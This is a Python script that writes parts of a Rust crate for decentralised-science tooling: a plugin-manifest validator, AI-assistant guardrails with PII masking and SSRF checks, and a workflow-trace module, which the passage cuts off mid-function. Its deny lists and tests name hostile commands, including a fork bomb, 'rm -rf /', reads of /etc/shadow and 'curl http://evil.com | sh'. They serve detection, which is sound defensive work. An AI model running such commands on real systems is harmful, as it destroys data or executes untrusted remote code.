import os
base_dir = "crates/arkhe-desci"
os.makedirs(f"{base_dir}/src", exist_ok=True)
os.makedirs(f"{base_dir}/tests", exist_ok=True)
os.makedirs(f"{base_dir}/contracts", exist_ok=True)

# Atualizar Cargo.toml com novas dependências
cargo_toml = '''[package]
name = "arkhe-desci"
version = "0.2.0"
edition = "2021"
authors = ["Arkhe Research Group <team@arkhe.io>"]
license = "MIT OR Apache-2.0"
description = "Integração ARKHE × DeSciOS × nodes.desci × ORCID — governança, rastreabilidade e identidade para ciência descentralizada"
repository = "https://github.com/arkhe/agi-monorepo"
readme = "README.md"

[dependencies]
# Serialization
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
serde_yaml = "0.9"

# Error handling
thiserror = "1.0"

# Logging
tracing = "0.1"

# Time
chrono = { version = "0.4", features = ["serde"] }

# Cryptography
blake3 = "1.5"

# Async
tokio = { version = "1.35", features = ["rt-multi-thread", "macros", "fs", "process"] }
async-trait = "0.1"

# HTTP client
reqwest = { version = "0.12", features = ["json", "multipart"], optional = true }

# Regex
regex = "1.10"

# DID / Identity (para ORCID integration)
# did-method-key = { version = "0.2", optional = true }

[features]
default = ["ipfs", "orcid"]
ipfs = ["dep:reqwest"]
orcid = ["dep:reqwest"]
sei-giga = ["dep:reqwest"]

[dev-dependencies]
tempfile = "3.14"
tokio-test = "0.4"
'''

with open(f"{base_dir}/Cargo.toml", "w") as f:
    f.write(cargo_toml)

print("✅ Cargo.toml atualizado v0.2.0")

error_rs = r'''//! Tipos de erro unificados para arkhe-desci v0.2.0
//!
//! Cobertura: plugins, guardrails, traceability, publishing,
//! nodes.desci, ORCID, SEI GigaChain.

use thiserror::Error;

/// Erro principal do crate
#[derive(Error, Debug)]
pub enum DesciError {
    // ── Plugin Governance ──
    #[error("Plugin validation failed: {0}")]
    PluginValidation(String),

    #[error("Duplicate plugin id: {0}")]
    DuplicatePlugin(String),

    #[error("Plugin not found: {0}")]
    PluginNotFound(String),

    // ── Assistant Guardrails ──
    #[error("PII detected: {0}")]
    PiiDetected(String),

    #[error("Content blocked: {category} — {reason}")]
    ContentBlocked { category: String, reason: String },

    #[error("Guardrail timeout after {0}s")]
    GuardrailTimeout(u64),

    // ── Workflow Traceability ──
    #[error("Integrity violation: causal chain mismatch for trace {trace_id}")]
    ChainMismatch { trace_id: String },

    #[error("Duplicate step id: {0}")]
    DuplicateStep(String),

    #[error("Step not found: {0}")]
    StepNotFound(String),

    // ── Publishing / IPFS ──
    #[error("IPFS error: {0}")]
    IpfsError(String),

    #[error("WormGraph error: {0}")]
    WormGraphError(String),

    // ── nodes.desci ──
    #[error("NodesDesci error: {0}")]
    NodesDesciError(String),

    #[error("Node not reachable: {url}")]
    NodeUnreachable { url: String },

    #[error("Dataset not found on node: {cid}")]
    DatasetNotFound { cid: String },

    // ── ORCID / DID ──
    #[error("ORCID error: {0}")]
    OrcidError(String),

    #[error("ORCID profile not found: {orcid_id}")]
    OrcidNotFound { orcid_id: String },

    #[error("DID resolution failed: {did}")]
    DidResolutionFailed { did: String },

    #[error("ORCID verification failed: {0}")]
    OrcidVerificationFailed(String),

    // ── SEI GigaChain ──
    #[error("SEI contract error: {0}")]
    SeiError(String),

    #[error("Transaction failed: {tx_hash} — {reason}")]
    TxFailed { tx_hash: String, reason: String },

    #[error("Anchor not found: {cid}")]
    AnchorNotFound { cid: String },

    // ── Comuns ──
    #[error("Serialization error: {0}")]
    Serialization(String),

    #[error("Network error: {0}")]
    Network(String),

    #[error("Not implemented: {0}")]
    NotImplemented(String),

    #[error("Internal error: {0}")]
    Internal(String),
}

// From impls para erros de crates externas
impl From<serde_json::Error> for DesciError {
    fn from(e: serde_json::Error) -> Self {
        Self::Serialization(e.to_string())
    }
}

impl From<serde_yaml::Error> for DesciError {
    fn from(e: serde_yaml::Error) -> Self {
        Self::Serialization(e.to_string())
    }
}

/// Resultado conveniente
pub type Result<T> = std::result::Result<T, DesciError>;
'''

with open(f"{base_dir}/src/error.rs", "w") as f:
    f.write(error_rs)

plugin_gov_rs = r'''//! Governança de plugins DeSciOS — validação contra invariantes ARKHE
//!
//! Valida manifestos YAML/JSON antes da instalação, bloqueando:
//! - Acesso a arquivos do sistema (/etc/passwd, /root)
//! - Comandos privilegiados (sudo, chmod 777)
//! - Fontes não permitidas
//! - Permissões excessivas

use std::collections::{HashSet, BTreeMap};
use serde::{Deserialize, Serialize};
use tracing::{info, warn};

use crate::error::{DesciError, Result};

/// Manifesto de um plugin DeSciOS
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PluginManifest {
    pub id: String,
    pub name: String,
    pub version: String,
    #[serde(default)]
    pub source: String,
    #[serde(default)]
    pub signature: Option<String>,
    pub install_script: String,
    #[serde(default)]
    pub requested_permissions: Vec<String>,
    #[serde(default)]
    pub dependencies: Vec<String>,
    #[serde(default)]
    pub checksum: Option<String>,
    #[serde(default)]
    pub author_did: Option<String>,
    #[serde(default)]
    pub node_desci_ref: Option<String>,
}

impl PluginManifest {
    pub fn from_yaml(path: &str) -> Result<Self> {
        let content = std::fs::read_to_string(path)
            .map_err(|e| DesciError::PluginValidation(format!("read {}: {}", path, e)))?;
        serde_yaml::from_str(&content)
            .map_err(|e| DesciError::PluginValidation(format!("YAML parse: {}", e)))
    }

    pub fn from_json_str(s: &str) -> Result<Self> {
        serde_json::from_str(s)
            .map_err(|e| DesciError::PluginValidation(format!("JSON parse: {}", e)))
    }

    pub fn to_json_str(&self) -> Result<String> {
        serde_json::to_string_pretty(self)
            .map_err(|e| DesciError::Serialization(e.to_string()))
    }
}

/// Resultado de uma checagem individual
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ValidationCheck {
    pub invariant_id: String,
    pub passed: bool,
    pub message: String,
}

/// Resultado completo da validação
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ValidationResult {
    pub plugin_id: String,
    pub passed: bool,
    pub checks: Vec<ValidationCheck>,
    pub summary: String,
}

/// Padrões perigosos no install_script
const DANGEROUS_PATTERNS: &[&str] = &[
    "/etc/passwd", "/etc/shadow", "/root/", "/var/run/",
    "sudo ", "sudo\n", "chmod 777", "chmod -R 777",
    "rm -rf /", "mkfs.", "dd if=/dev/zero",
    "> /dev/sd", ":(){ :|:& };:",  // fork bomb
    "curl.*|\\s*(ba)?sh", "wget.*|\\s*(ba)?sh",
];

/// Validador de plugins
#[derive(Debug, Clone)]
pub struct PluginValidator {
    allowed_sources: HashSet<String>,
    required_signatures: bool,
    max_permissions: usize,
    dangerous_patterns: Vec<regex::Regex>,
}

impl Default for PluginValidator {
    fn default() -> Self {
        let dangerous_patterns: Vec<regex::Regex> = DANGEROUS_PATTERNS
            .iter()
            .filter_map(|p| regex::Regex::new(p).ok())
            .collect();

        Self {
            allowed_sources: [
                "https://github.com".into(),
                "https://gitlab.com".into(),
                "https://nodes.desci.com".into(),
            ].into_iter().collect(),
            required_signatures: false,
            max_permissions: 5,
            dangerous_patterns,
        }
    }
}

impl PluginValidator {
    pub fn new(
        allowed_sources: Vec<String>,
        required_signatures: bool,
        max_permissions: usize,
    ) -> Self {
        let dangerous_patterns: Vec<regex::Regex> = DANGEROUS_PATTERNS
            .iter()
            .filter_map(|p| regex::Regex::new(p).ok())
            .collect();
        Self {
            allowed_sources: allowed_sources.into_iter().collect(),
            required_signatures,
            max_permissions,
            dangerous_patterns,
        }
    }

    /// Valida um manifesto contra todas as invariantes
    pub fn validate(&self, manifest: &PluginManifest) -> Result<ValidationResult> {
        let mut checks = Vec::new();
        let mut all_passed = true;

        // INV-001: Assinatura
        let sig_ok = if self.required_signatures && manifest.signature.is_none() {
            all_passed = false;
            false
        } else {
            true
        };
        checks.push(ValidationCheck {
            invariant_id: "INV-001".into(),
            passed: sig_ok,
            message: if sig_ok { "Signature OK".into() } else { "Missing signature".into() },
        });

        // INV-002: Padrões perigosos
        let mut matched_dangerous = Vec::new();
        for re in &self.dangerous_patterns {
            if re.is_match(&manifest.install_script) {
                matched_dangerous.push(re.as_str().to_string());
            }
        }
        let danger_ok = matched_dangerous.is_empty();
        if !danger_ok { all_passed = false; }
        checks.push(ValidationCheck {
            invariant_id: "INV-002".into(),
            passed: danger_ok,
            message: if danger_ok {
                "No dangerous patterns".into()
            } else {
                format!("Dangerous: {}", matched_dangerous.join(", "))
            },
        });

        // INV-003: Permissões
        let perm_ok = manifest.requested_permissions.len() <= self.max_permissions;
        if !perm_ok { all_passed = false; }
        checks.push(ValidationCheck {
            invariant_id: "INV-003".into(),
            passed: perm_ok,
            message: format!(
                "{} permissions (max {})",
                manifest.requested_permissions.len(),
                self.max_permissions
            ),
        });

        // INV-004: Fonte permitida
        let source_ok = self.allowed_sources.is_empty()
            || self.allowed_sources.iter().any(|s| manifest.source.starts_with(s));
        if !source_ok { all_passed = false; }
        checks.push(ValidationCheck {
            invariant_id: "INV-004".into(),
            passed: source_ok,
            message: if source_ok {
                "Source allowed".into()
            } else {
                format!("Source '{}' not allowed", manifest.source)
            },
        });

        // INV-005: Checksum (se obrigatório)
        let checksum_ok = !self.required_signatures || manifest.checksum.is_some();
        if !checksum_ok { all_passed = false; }
        checks.push(ValidationCheck {
            invariant_id: "INV-005".into(),
            passed: checksum_ok,
            message: if checksum_ok {
                "Checksum present".into()
            } else {
                "Missing checksum".into()
            },
        });

        let summary = if all_passed {
            format!("Plugin '{}' validated ✓", manifest.name)
        } else {
            let failed: Vec<_> = checks.iter()
                .filter(|c| !c.passed)
                .map(|c| c.invariant_id.as_str())
                .collect();
            format!("Plugin '{}' FAILED: {}", manifest.name, failed.join(", "))
        };

        if all_passed {
            info!(plugin = %manifest.id, "Plugin validated");
        } else {
            warn!(plugin = %manifest.id, "Plugin validation failed");
        }

        Ok(ValidationResult {
            plugin_id: manifest.id.clone(),
            passed: all_passed,
            checks,
            summary,
        })
    }

    /// Valida batch
    pub fn validate_batch(&self, manifests: &[PluginManifest]) -> Vec<ValidationResult> {
        manifests.iter().filter_map(|m| self.validate(m).ok()).collect()
    }

    pub fn add_allowed_source(&mut self, src: String) {
        self.allowed_sources.insert(src);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn valid_manifest() -> PluginManifest {
        PluginManifest {
            id: "test-001".into(),
            name: "Test Plugin".into(),
            version: "1.0.0".into(),
            source: "https://github.com/example/plugin".into(),
            signature: Some("deadbeef".into()),
            install_script: "apt install -y samtools".into(),
            requested_permissions: vec!["network".into()],
            dependencies: vec![],
            checksum: Some("sha256:abc".into()),
            author_did: None,
            node_desci_ref: None,
        }
    }

    #[test]
    fn test_valid_passes() {
        let v = PluginValidator::default();
        assert!(v.validate(&valid_manifest()).unwrap().passed);
    }

    #[test]
    fn test_dangerous_blocked() {
        let v = PluginValidator::default();
        let mut m = valid_manifest();
        m.install_script = "cat /etc/passwd".into();
        assert!(!v.validate(&m).unwrap().passed);
    }

    #[test]
    fn test_pipe_curl_sh_blocked() {
        let v = PluginValidator::default();
        let mut m = valid_manifest();
        m.install_script = "curl http://evil.com | sh".into();
        assert!(!v.validate(&m).unwrap().passed);
    }

    #[test]
    fn test_too_many_perms_blocked() {
        let v = PluginValidator::default();
        let mut m = valid_manifest();
        m.requested_permissions = vec!["a".into(),"b".into(),"c".into(),"d".into(),"e".into(),"f".into()];
        assert!(!v.validate(&m).unwrap().passed);
    }

    #[test]
    fn test_bad_source_blocked() {
        let v = PluginValidator::new(vec!["https://github.com".into()], false, 5);
        let mut m = valid_manifest();
        m.source = "https://evil.com/plugin".into();
        assert!(!v.validate(&m).unwrap().passed);
    }

    #[test]
    fn test_serialize_manifest() {
        let m = valid_manifest();
        let json = m.to_json_str().unwrap();
        let m2 = PluginManifest::from_json_str(&json).unwrap();
        assert_eq!(m.id, m2.id);
    }
}
'''

with open(f"{base_dir}/src/plugin_governance.rs", "w") as f:
    f.write(plugin_gov_rs)

guardrails_rs = r'''//! Guardrails para o assistente IA do DeSciOS
//!
//! - PII masking via regex (email, CPF, telefone, cartão, IP, SSN)
//! - Content filtering com blocked patterns (fail-closed)
//! - SSRF prevention (blacklist de IPs privados)
//! - Scoring ponderado por contexto científico

use std::net::IpAddr;
use std::collections::BTreeMap;
use serde::{Deserialize, Serialize};
use tracing::{info, warn};

use crate::error::{DesciError, Result};

// ── PII Types ──

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash)]
pub enum PiiType {
    Email,
    PhoneNumber,
    Cpf,
    CreditCard,
    Ssn,
    IpAddress,
    Passport,
    BankAccount,
    Custom(String),
}

impl std::fmt::Display for PiiType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Email => write!(f, "email"),
            Self::PhoneNumber => write!(f, "phone"),
            Self::Cpf => write!(f, "cpf"),
            Self::CreditCard => write!(f, "credit_card"),
            Self::Ssn => write!(f, "ssn"),
            Self::IpAddress => write!(f, "ip"),
            Self::Passport => write!(f, "passport"),
            Self::BankAccount => write!(f, "bank_account"),
            Self::Custom(s) => write!(f, "custom:{}", s),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Redaction {
    pub pii_type: PiiType,
    pub start: usize,
    pub end: usize,
    pub original: String,
    pub masked: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PiiCheckResult {
    pub masked_text: String,
    pub redactions: Vec<Redaction>,
    pub has_pii: bool,
}

// ── PII Masker ──

pub struct PiiMasker {
    patterns: Vec<(PiiType, regex::Regex, String)>,
}

impl PiiMasker {
    pub fn new() -> Self {
        let patterns = vec![
            (PiiType::Email,
             regex::Regex::new(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}").unwrap(),
             "[EMAIL]".into()),
            (PiiType::Cpf,
             regex::Regex::new(r"\b\d{3}[.]?\d{3}[.]?\d{3}[-]?\d{2}\b").unwrap(),
             "[CPF]".into()),
            (PiiType::PhoneNumber,
             regex::Regex::new(r"\(?\d{2}\)?\s?\d{4,5}[-.]?\d{4}").unwrap(),
             "[PHONE]".into()),
            (PiiType::CreditCard,
             regex::Regex::new(r"\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b").unwrap(),
             "[CC]".into()),
            (PiiType::IpAddress,
             regex::Regex::new(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b").unwrap(),
             "[IP]".into()),
            (PiiType::Ssn,
             regex::Regex::new(r"\b\d{3}-\d{2}-\d{4}\b").unwrap(),
             "[SSN]".into()),
        ];
        Self { patterns }
    }

    pub fn mask(&self, text: &str) -> PiiCheckResult {
        let mut all_matches: Vec<(usize, usize, &PiiType, &str)> = Vec::new();
        for (pii_type, re, replacement) in &self.patterns {
            for mat in re.find_iter(text) {
                all_matches.push((mat.start(), mat.end(), pii_type, replacement.as_str()));
            }
        }
        // Ordenar reverso para preservar offsets
        all_matches.sort_by(|a, b| b.0.cmp(&a.0));

        let mut masked = text.to_string();
        let mut redactions = Vec::new();
        for (start, end, pii_type, replacement) in all_matches {
            let original = text[start..end].to_string();
            masked = format!("{}{}{}", &masked[..start], replacement, &masked[end..]);
            redactions.push(Redaction {
                pii_type: pii_type.clone(),
                start,
                end,
                original,
                masked: replacement.to_string(),
            });
        }
        redactions.reverse();

        PiiCheckResult {
            has_pii: !redactions.is_empty(),
            masked_text: masked,
            redactions,
        }
    }
}

impl Default for PiiMasker {
    fn default() -> Self { Self::new() }
}

// ── Guardrail Categories ──

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash)]
pub enum GuardrailCategory {
    HarmfulContent,
    SystemExploitation,
    UnauthorizedAccess,
    PiiExfiltration,
    DataDestruction,
    Custom(String),
}

impl std::fmt::Display for GuardrailCategory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::HarmfulContent => write!(f, "harmful_content"),
            Self::SystemExploitation => write!(f, "system_exploitation"),
            Self::UnauthorizedAccess => write!(f, "unauthorized_access"),
            Self::PiiExfiltration => write!(f, "pii_exfiltration"),
            Self::DataDestruction => write!(f, "data_destruction"),
            Self::Custom(s) => write!(f, "custom:{}", s),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GuardrailCheckResult {
    pub safe: bool,
    pub category: Option<GuardrailCategory>,
    pub reason: Option<String>,
    pub risk_score: f32,
}

// ── Context ──

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AssistantContext {
    pub user_id: String,
    pub session_id: String,
    pub timestamp: String,
    pub active_tools: Vec<String>,
    pub workspace_path: String,
}

impl Default for AssistantContext {
    fn default() -> Self {
        Self {
            user_id: "anonymous".into(),
            session_id: format!("ses-{}", blake3::hash(
                &chrono::Utc::now().timestamp_millis().to_le_bytes()
            ).to_string()[..8].to_string()),
            timestamp: chrono::Utc::now().to_rfc3339(),
            active_tools: Vec::new(),
            workspace_path: "/home/deScier".into(),
        }
    }
}

// ── Config ──

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GuardrailConfig {
    pub pii_masking_enabled: bool,
    pub content_check_enabled: bool,
    pub risk_threshold: f32,
    pub blocked_patterns: Vec<String>,
    pub timeout_seconds: u64,
}

impl Default for GuardrailConfig {
    fn default() -> Self {
        Self {
            pii_masking_enabled: true,
            content_check_enabled: true,
            risk_threshold: 0.7,
            blocked_patterns: vec![
                r"rm\s+-rf\s+/".into(),
                r"mkfs\.".into(),
                r"dd\s+if=/dev/zero".into(),
                r">\s*/dev/sd".into(),
                r"chmod\s+777\s+/".into(),
                r"curl.*\|\s*(ba)?sh".into(),
                r"wget.*\|\s*(ba)?sh".into(),
                r":\(\)\s*\{".into(),  // fork bomb
            ],
            timeout_seconds: 10,
        }
    }
}

// ── Main Guardrails ──

pub struct DeSciAssistantGuardrails {
    config: GuardrailConfig,
    pii_masker: PiiMasker,
    blocked_regexes: Vec<regex::Regex>,
    /// Indicadores de risco com pesos
    risk_indicators: Vec<(&'static str, f32)>,
    /// Redutores de risco (contexto científico)
    sci_context: Vec<&'static str>,
}

impl DeSciAssistantGuardrails {
    pub fn new() -> Self {
        Self::with_config(GuardrailConfig::default())
    }

    pub fn with_config(config: GuardrailConfig) -> Self {
        let blocked_regexes: Vec<regex::Regex> = config.blocked_patterns
            .iter()
            .filter_map(|p| regex::Regex::new(p).ok())
            .collect();

        Self {
            pii_masker: PiiMasker::new(),
            blocked_regexes,
            risk_indicators: vec![
                ("delete all", 0.8), ("drop table", 0.9),
                ("format disk", 0.9), ("overwrite", 0.4),
                ("bypass", 0.5), ("sudo", 0.3),
                ("password", 0.2), ("secret", 0.3),
                ("api key", 0.4), ("credential", 0.4),
                ("private key", 0.6),
            ],
            sci_context: vec![
                "gene", "protein", "sequence", "alignment", "blast",
                "genome", "transcript", "expression", "pathway",
                "jupyter", "notebook", "analysis", "dataset",
                "variant", "mutation", "phylotree",
            ],
            config,
        }
    }

    /// Verifica e processa mensagem — FAIL-CLOSED
    pub fn check_message(
        &self,
        message: &str,
        _context: &AssistantContext,
    ) -> Result<(String, GuardrailCheckResult)> {
        // 1. Blocked patterns (fail-closed, sem LLM)
        for re in &self.blocked_regexes {
            if re.is_match(message) {
                warn!(pattern = %re.as_str(), "Blocked pattern");
                return Ok((
                    "[CONTENT_BLOCKED]".into(),
                    GuardrailCheckResult {
                        safe: false,
                        category: Some(GuardrailCategory::SystemExploitation),
                        reason: Some("Matches blocked pattern".into()),
                        risk_score: 1.0,
                    },
                ));
            }
        }

        // 2. PII masking
        let processed = if self.config.pii_masking_enabled {
            let result = self.pii_masker.mask(message);
            if result.has_pii {
                info!(count = result.redactions.len(), "PII masked");
            }
            result.masked_text
        } else {
            message.to_string()
        };

        // 3. Risk scoring (local heuristics — fail-closed se LLM indisponível)
        let risk = self.compute_local_risk(&processed);

        let check = if risk >= self.config.risk_threshold {
            GuardrailCheckResult {
                safe: false,
                category: Some(GuardrailCategory::HarmfulContent),
                reason: Some(format!("Risk {:.2} >= threshold {:.2}", risk, self.config.risk_threshold)),
                risk_score: risk,
            }
        } else {
            GuardrailCheckResult {
                safe: true,
                category: None,
                reason: None,
                risk_score: risk,
            }
        };

        Ok((processed, check))
    }

    /// SSRF prevention
    pub fn check_url(&self, url: &str) -> Result<GuardrailCheckResult> {
        // Parse simples de URL
        let host = url
            .trim_start_matches("http://")
            .trim_start_matches("https://")
            .split('/').next()
            .unwrap_or("")
            .split(':').next()
            .unwrap_or("");

        let blocked_hosts = ["localhost", "127.0.0.1", "0.0.0.0", "::1"];
        if blocked_hosts.contains(&host) {
            return Ok(GuardrailCheckResult {
                safe: false,
                category: Some(GuardrailCategory::UnauthorizedAccess),
                reason: Some("Internal URL blocked (SSRF)".into()),
                risk_score: 1.0,
            });
        }

        if let Ok(addr) = host.parse::<IpAddr>() {
            if is_private_ip(&addr) {
                return Ok(GuardrailCheckResult {
                    safe: false,
                    category: Some(GuardrailCategory::UnauthorizedAccess),
                    reason: Some("Private IP blocked".into()),
                    risk_score: 1.0,
                });
            }
        }

        Ok(GuardrailCheckResult {
            safe: true, category: None, reason: None, risk_score: 0.0,
        })
    }

    fn compute_local_risk(&self, text: &str) -> f32 {
        let lower = text.to_lowercase();
        let mut score: f32 = 0.0;
        for (indicator, weight) in &self.risk_indicators {
            if lower.contains(indicator) {
                score = score.max(*weight);
            }
        }
        // Redutor de contexto científico
        let sci_hits = self.sci_context.iter().filter(|s| lower.contains(*s)).count();
        if sci_hits > 0 {
            score *= 0.5;
        }
        score.min(1.0)
    }

    pub fn config(&self) -> &GuardrailConfig { &self.config }
}

impl Default for DeSciAssistantGuardrails {
    fn default() -> Self { Self::new() }
}

fn is_private_ip(addr: &IpAddr) -> bool {
    match addr {
        IpAddr::V4(v4) => v4.is_private() || v4.is_loopback() || v4.is_link_local(),
        IpAddr::V6(v6) => v6.is_loopback(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_email_masked() {
        let m = PiiMasker::new();
        let r = m.mask("email: user@example.com");
        assert!(r.has_pii);
        assert!(r.masked_text.contains("[EMAIL]"));
        assert!(!r.masked_text.contains("user@example.com"));
    }

    #[test]
    fn test_cpf_masked() {
        let m = PiiMasker::new();
        let r = m.mask("CPF 123.456.789-00");
        assert!(r.has_pii);
        assert!(r.masked_text.contains("[CPF]"));
    }

    #[test]
    fn test_no_pii() {
        let m = PiiMasker::new();
        let r = m.mask("Run BLAST alignment");
        assert!(!r.has_pii);
        assert_eq!(r.redactions.len(), 0);
    }

    #[test]
    fn test_rm_rf_blocked() {
        let g = DeSciAssistantGuardrails::new();
        let ctx = AssistantContext::default();
        let (proc, check) = g.check_message("rm -rf /home/user", &ctx).unwrap();
        assert!(!check.safe);
        assert_eq!(proc, "[CONTENT_BLOCKED]");
    }

    #[test]
    fn test_fork_bomb_blocked() {
        let g = DeSciAssistantGuardrails::new();
        let ctx = AssistantContext::default();
        let (_, check) = g.check_message(":(){ :|:& };:", &ctx).unwrap();
        assert!(!check.safe);
    }

    #[test]
    fn test_scientific_query_passes() {
        let g = DeSciAssistantGuardrails::new();
        let ctx = AssistantContext::default();
        let (proc, check) = g.check_message(
            "Run BLAST on BRCA1 gene sequence", &ctx
        ).unwrap();
        assert!(check.safe);
        assert_eq!(proc, "Run BLAST on BRCA1 gene sequence");
    }

    #[test]
    fn test_pii_in_scientific_query_masked() {
        let g = DeSciAssistantGuardrails::new();
        let ctx = AssistantContext::default();
        let (proc, check) = g.check_message(
            "Send results to researcher@uni.edu", &ctx
        ).unwrap();
        assert!(check.safe);
        assert!(proc.contains("[EMAIL]"));
    }

    #[test]
    fn test_ssrf_localhost_blocked() {
        let g = DeSciAssistantGuardrails::new();
        let r = g.check_url("http://localhost:5001/api/v0/add").unwrap();
        assert!(!r.safe);
    }

    #[test]
    fn test_ssrf_10_0_0_1_blocked() {
        let g = DeSciAssistantGuardrails::new();
        let r = g.check_url("http://10.0.0.1/admin").unwrap();
        assert!(!r.safe);
    }

    #[test]
    fn test_ssrf_external_ok() {
        let g = DeSciAssistantGuardrails::new();
        let r = g.check_url("https://ncbi.nlm.nih.gov/blast").unwrap();
        assert!(r.safe);
    }

    #[test]
    fn test_empty_message_safe() {
        let g = DeSciAssistantGuardrails::new();
        let ctx = AssistantContext::default();
        let (proc, check) = g.check_message("", &ctx).unwrap();
        assert!(check.safe);
        assert_eq!(proc, "");
    }
}
'''

with open(f"{base_dir}/src/assistant_guardrails.rs", "w") as f:
    f.write(guardrails_rs)

trace_rs = r'''//! Rastreabilidade IC16 — causal chains com blake3
//!
//! Cada step é hasheado com serialização canônica (BTreeMap).
//! A cadeia é acumulativa: hash(chain_prev + hash_step).
//! Qualquer mutação detectável via verify().

use std::collections::BTreeMap;
use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};
use tracing::info;

use crate::error::{DesciError, Result};

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct StepId(String);

impl StepId {
    pub fn new(id: impl Into<String>) -> Self { Self(id.into()) }
    pub fn as_str(&self) -> &str { &self.0 }
}

impl std::fmt::Display for StepId {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum StepStatus {
    Pending,
    Running,
    Completed,
    Failed { error: String },
    Skipped { reason: String },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WorkflowStep {
    pub id: StepId,
    pub name: String,
    pub tool: String,
    pub status: StepStatus,
    pub parameters: serde_json::Value,
    pub inputs: Vec<String>,
    pub outputs: Vec<String>,
    pub started_at: Option<DateTime<Utc>>,
    pub completed_at: Option<DateTime<Utc>>,
    pub hash: Option<String>,
    /// DID do agente que executou o step
    pub agent_did: Option<String>,
}

impl WorkflowStep {
    pub fn new(id: impl Into<String>, name: &str, tool: &str) -> Self {
        Self {
            id: StepId::new(id),
            name: name.into(),
            tool: tool.into(),
            status: StepStatus::Pending,
            parameters: serde_json::Value::Object(serde_json::Map::new()),
            inputs: Vec::new(),
            outputs: Vec::new(),
            started_at: None,
            completed_at: None,
            hash: None,
            agent_did: None,
        }
    }

    pub fn with_parameters(mut self, params: serde_json::Value) -> Self {
        self.parameters = params; self
    }
    pub fn with_inputs(mut self, inputs: Vec<String>) -> Self {
        self.inputs = inputs; self
    }
    pub fn with_agent(mut self, did: &str) -> Self {
        self.agent_did = Some(did.into()); self
    }

    pub fn start(&mut self) {
        self.status = StepStatus::Running;
        self.started_at = Some(Utc::now());
    }
    pub fn complete(&mut self, outputs: Vec<String>) {
        self.status = StepStatus::Completed;
        self.outputs = outputs;
        self.completed_at = Some(Utc::now());
    }
    pub fn fail(&mut self, err: impl Into<String>) {
        self.status = StepStatus::Failed { error: err.into() };
        self.completed_at = Some(Utc::now());
    }

    /// Hash determinístico via BTreeMap canônico
    pub fn compute_hash(&self) -> String {
        let mut map = BTreeMap::new();
        map.insert("id", serde_json::Value::String(self.id.0.clone()));
        map.insert("name", serde_json::Value::String(self.name.clone()));
        map.insert("tool", serde_json::Value::String(self.tool.clone()));
        map.insert("parameters", self.parameters.clone());
        map.insert("inputs", serde_json::to_value(&self.inputs).unwrap_or_default());
        map.insert("outputs", serde_json::to_value(&self.outputs).unwrap_or_default());
        if let Some(ref did) = self.agent_did {
            map.insert("agent_did", serde_json::Value::String(did.clone()));
        }
        let canonical = serde_json::to_string(&map).unwrap_or_default();
        blake3::hash(canonical.as_bytes()).to_string()
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum WorkflowType {
    Nextflow,
    Jupyter,
    Snakemake,
    Custom(String),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScientificWorkflowTrace {
    pub trace_id: String,
    pub workflow_name: String,
    pub workflow_type: WorkflowType,
    pub steps: Vec<WorkflowStep>,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
    pub causal_chain: String,
    pub metadata: BTreeMap<String, String>,
    /// DID do pesquisador dono do workflow
    pub owner_did: Option<String>,
}

impl ScientificWorkflowTrace {
    pub fn new(name: &str, wtype: WorkflowType) -> Self {
        let trace_id = blake3::hash(
            format!("{}:{}", name, Utc::now().timestamp_millis()).as_bytes()
        ).to_string();
        let now = Utc::now();
        Self {
            trace_id, workflow_name: name.into(), workflow_type: wtype,
            steps: Vec::new(), created_at: now, updated_at: now,
            causal_chain: String::new(), metadata: BTreeMap::new(),
            owner_did: None,
        }
    }

    pub fn with_owner(mut self, did: &str) -> Self {
        self.owner_did = Some(did.into()); self
    }
    pub fn with_metadata(mut self, k: &str, v: &str) -> Self {
        self.metadata.insert(k.into(), v.into()); self
    }

    pub fn add_step(&mut self, mut step: WorkflowStep) -> Result<()> {
        if self.steps.iter().any(|s| s.id == step.id) {
            return Err(DesciError::DuplicateStep(step.id.to_string()));
        }
        step.hash = Some(step.compute_hash());
        self.steps.push(step);
        self.recompute_chain();
        self.updated_at = Utc::now();
        Ok(())
    }

    fn recompute_chain(&mut self) {
        let mut chain = format!("{}:{}", self.trace_id, self.workflow_name);
        for step in &self.steps {
            let sh = step.hash.as_deref().unwrap_or("");
            chain = blake3::hash(format!("{}:{}", chain, sh).as_bytes()).to_string();
        }
        self.causal_chain = chain;
    }

    /// Verifica integridade — O(n) recalculando tudo
    pub fn verify(&self) -> bool {
        let mut chain = format!("{}:{}", self.trace_id, self.workflow_name);
        for step in &self.steps {
            let expected = step.compute_hash();
            if step.hash.as_deref() != Some(&expected) {
                info!(step = %step.id, "Hash mismatch");
                return false;
            }
            chain = blake3::hash(
                format!("{}:{}", chain, step.hash.as_deref().unwrap_or("")).as_bytes()
            ).to_string();
